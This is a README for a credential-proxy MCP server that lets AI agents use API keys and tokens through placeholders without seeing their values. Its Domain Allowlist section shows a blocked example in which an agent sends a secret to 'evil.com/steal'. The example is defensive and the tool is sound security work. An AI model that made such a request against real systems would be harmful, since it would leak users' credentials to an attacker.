# credential-proxy

MCP server for secure credential management. Agents can make authenticated API requests without ever seeing credential values.

## Security Model

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SECRET NEVER CROSSES THIS LINE                   │
├─────────────────────────────────────────────────────────────────────┤
│  Agent Context              │      MCP Server (Trusted)             │
│  (Untrusted)                │                                       │
│  • Sees secret NAMES        │  • Stores encrypted VALUES           │
│  • Uses {{PLACEHOLDER}}     │  • Validates domain allowlist        │
│  • Receives sanitized resp  │  • Executes actual requests          │
│  • Cannot exfiltrate        │  • Redacts leaked values             │
└─────────────────────────────────────────────────────────────────────┘
```

## Installation

```bash
# Clone and build
git clone https://github.com/yourusername/credential-proxy.git
cd credential-proxy
npm install
npm run build

# Install to Claude Code
npx credential-proxy install
```

This adds the MCP server to `~/.claude.json` and copies files to `~/.claude/mcp-servers/credential-proxy/`.

## CLI Commands

### Add a secret

```bash
# Store encrypted locally
npx credential-proxy add LINEAR_API_KEY -d "*.linear.app,api.linear.app"
npx credential-proxy add GITHUB_TOKEN -d "*.github.com" -p "header,body"

# Use 1Password as source (no local storage)
npx credential-proxy add GITHUB_TOKEN --1password "op://Private/GitHub/token" -d "*.github.com"
npx credential-proxy add DEPLOY_KEY --op "op://Work/Deploy Key/password" -d "*.example.com" -p "env,arg"

# Allow for exec proxy with command restrictions
npx credential-proxy add GIT_TOKEN -d "*.github.com" -p "arg,env" -c "git *"
```

Options:
- `-d, --domains` - Comma-separated allowed domains (required)
- `-p, --placements` - Comma-separated placements: `header`, `body`, `query`, `env`, `arg` (default: `header`)
- `-c, --commands` - Comma-separated command patterns for exec proxy (e.g., `"git *,npm *"`)
- `--1password <ref>` / `--op <ref>` - 1Password reference instead of local storage

### List secrets

```bash
npx credential-proxy list
npx credential-proxy list --json
```

### Remove a secret

```bash
npx credential-proxy remove LINEAR_API_KEY
```

### Rotate a secret

```bash
npx credential-proxy rotate LINEAR_API_KEY
```

### Test a secret

```bash
npx credential-proxy test LINEAR_API_KEY
```

### Export secrets

Export all secrets to a JSON file (includes decrypted values):

```bash
npx credential-proxy export ~/secrets-backup.json
npx credential-proxy export --stdout  # print to stdout
```

### Import secrets

Import secrets from an export file:

```bash
npx credential-proxy import ~/secrets-backup.json
npx credential-proxy import ~/secrets-backup.json --dry-run    # preview changes
npx credential-proxy import ~/secrets-backup.json --overwrite  # replace existing
```

### Transfer between systems via SSH

**Note:** SSH non-interactive sessions don't load shell profiles, so use `source ~/.zshrc` or absolute paths.

Push secrets to a remote machine:

```bash
# If credential-proxy is installed on both machines
credential-proxy export --stdout | ssh dest 'source ~/.zshrc && credential-proxy import --stdin'

# Or with absolute node path (macOS Homebrew)
credential-proxy export --stdout | ssh dest '/opt/homebrew/bin/node ~/.claude/mcp-servers/credential-proxy/cli/index.js import --stdin'
```

Pull secrets from a remote machine:

```bash
ssh source 'source ~/.zshrc && credential-proxy export --stdout' | credential-proxy import --stdin

# Or with absolute node path (macOS Homebrew)
ssh source '/opt/homebrew/bin/node ~/.claude/mcp-servers/credential-proxy/cli/index.js export --stdout' | credential-proxy import --stdin
```

⚠️ **Security note:** Export files contain decrypted secrets. Delete them immediately after use.

### HTTP Server mode

Run credential-proxy as an HTTP server for non-MCP clients:

```bash
credential-proxy serve                    # default: localhost:8787
credential-proxy serve --port 9000        # custom port
credential-proxy serve --host 0.0.0.0     # bind to all interfaces (use with caution)
```

**Run as a service (macOS):**

```bash
# Install and start launchd service
./launchd/install-service.sh

# Service commands
launchctl unload ~/Library/LaunchAgents/com.claudetmux.credential-proxy.plist  # stop
launchctl load ~/Library/LaunchAgents/com.claudetmux.credential-proxy.plist    # start

# View logs
tail -f ~/.local/share/credential-proxy/logs/http-server.log

# Uninstall service
./launchd/uninstall-service.sh
```

**Endpoints:**

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Health check |
| GET | `/credentials` | List configured credentials |
| POST | `/proxy` | Make proxied HTTP request with credential substitution |
| POST | `/exec` | Execute command with credential substitution |

**Example:**

```bash
curl -X POST http://127.0.0.1:8787/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "method": "GET",
    "url": "https://api.linear.app/graphql",
    "headers": {"Authorization": "Bearer {{LINEAR_API_KEY}}"},
    "body": {"query": "{ viewer { id } }"}
  }'
```

## MCP Tools

### `list_credentials`

Discover available secrets (names and metadata only, not values).

```typescript
> list_credentials()

{
  "secrets": [
    {
      "name": "LINEAR_API_KEY",
      "allowedDomains": ["*.linear.app"],
      "allowedPlacements": ["header"],
      "configured": true
    }
  ]
}
```

### `proxy_request`

Make HTTP requests with credential substitution using `{{SECRET_NAME}}` placeholders.

```typescript
> proxy_request({
    method: "POST",
    url: "https://api.linear.app/graphql",
    headers: {
      "Authorization": "Bearer {{LINEAR_API_KEY}}",
      "Content-Type": "application/json"
    },
    body: {
      "query": "{ issues { nodes { id title } } }"
    }
  })

{
  "status": 200,
  "body": "{\"data\":{\"issues\":{...}}}",
  "redacted": false
}
```

### `proxy_exec`

Execute shell commands with credential substitution. Secrets can be injected into command arguments or environment variables.

```typescript
> proxy_exec({
    command: ["git", "clone", "https://{{GITHUB_TOKEN}}@github.com/org/repo.git"],
    cwd: "/tmp"
  })

{
  "exitCode": 0,
  "stdout": "Cloning into 'repo'...\n",
  "stderr": "",
  "redacted": false,
  "timedOut": false
}
```

With environment variables:

```typescript
> proxy_exec({
    command: ["gh", "api", "/user"],
    env: { "GH_TOKEN": "{{GITHUB_TOKEN}}" }
  })

{
  "exitCode": 0,
  "stdout": "{\"login\": \"username\", ...}",
  "stderr": "",
  "redacted": false,
  "timedOut": false
}
```

**Security:**
- Secrets must have `arg` or `env` in their `allowedPlacements`
- Optional `allowedCommands` restricts which commands can use the secret
- All secret values are redacted from stdout/stderr before returning

## 1Password Integration

Instead of storing encrypted secrets locally, you can reference secrets in 1Password. The credential-proxy will fetch values on-demand using the `op` CLI.

### Setup

1. Install 1Password CLI: https://developer.1password.com/docs/cli/get-started/
2. Authenticate: `op signin`

### Add a 1Password-backed secret

```bash
credential-proxy add GITHUB_TOKEN \
  --1password "op://Private/GitHub Token/password" \
  -d "*.github.com" \
  -p "header,env,arg"
```

The `op://` reference format is: `op://vault/item/field` or `op://vault/item/section/field`

### Benefits

- **No local secret storage** — values fetched from 1Password on each use
- **Automatic rotation** — update in 1Password, credential-proxy picks it up
- **Centralized management** — one source of truth for all secrets
- **Short-lived cache** — 1-minute cache to balance security and performance

### Requirements

- `op` CLI must be installed and authenticated
- Agent/process must have access to the 1Password CLI session

## Security Features

### Domain Allowlist

Secrets can only be used with specified domains:

```bash
# This secret only works with Linear
npx credential-proxy add LINEAR_API_KEY -d "*.linear.app"
```

If an agent tries to use it with a different domain:

```typescript
> proxy_request({
    url: "https://evil.com/steal",
    headers: { "X-Key": "{{LINEAR_API_KEY}}" }
  })

{
  "error": "SECRET_DOMAIN_BLOCKED",
  "message": "Secret 'LINEAR_API_KEY' cannot be used with domain 'evil.com'",
  "allowedDomains": ["*.linear.app"]
}
```

### Placement Validation

Control where secrets can appear:

```bash
# Only in headers
npx credential-proxy add API_KEY -d "*.example.com" -p "header"

# In headers and body
npx credential-proxy add WEBHOOK_SECRET -d "*.example.com" -p "header,body"
```

### Response Redaction

If a secret value appears in an API response, it's automatically redacted:

```typescript
// If API returns: {"apiKey": "lin_abc123..."}
// Agent receives: {"apiKey": "[REDACTED:LINEAR_API_KEY]"}
```

### Encryption

- Secrets encrypted with AES-256-GCM
- Encryption key stored in system keyring (macOS Keychain, Linux libsecret)
- Fallback to file-based key storage for headless systems
- All secret files have strict permissions (chmod 600)

### Audit Logging

All secret usage is logged to `~/.local/share/credential-proxy/logs/secrets-audit.log`:

```
[2025-12-31T10:00:00Z] SECRET_USED secret=LINEAR_API_KEY domain=api.linear.app method=POST status=200 duration=234ms
[2025-12-31T10:00:05Z] SECRET_BLOCKED secret=LINEAR_API_KEY domain=evil.com reason=DOMAIN_NOT_ALLOWED
```

## File Locations

| Path | Purpose |
|------|---------|
| `~/.claude/mcp-servers/credential-proxy/` | MCP server installation |
| `~/.local/share/credential-proxy/secrets.json` | Encrypted secrets |
| `~/.local/share/credential-proxy/secrets.key` | Encryption key (fallback) |
| `~/.local/share/credential-proxy/logs/` | Audit logs |

## Development

```bash
npm install
npm run build
npm run test
npm run dev  # watch mode
```

## License

MIT
